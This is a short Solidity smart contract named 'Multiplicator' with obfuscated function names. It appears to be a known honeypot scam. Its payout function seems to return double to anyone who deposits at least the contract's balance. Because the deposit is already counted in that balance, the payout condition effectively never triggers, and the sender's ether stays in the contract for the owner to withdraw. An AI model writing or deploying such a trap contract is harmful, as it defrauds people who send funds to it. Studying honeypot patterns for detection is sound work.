// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.sender;

    function()payable{}

    function _0x06d64d()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function _0xb92131(address _0x1caf9f)
    payable
    {
        if(msg.value>=this.balance)
        {
            _0x1caf9f.transfer(this.balance+msg.value);
        }
    }
}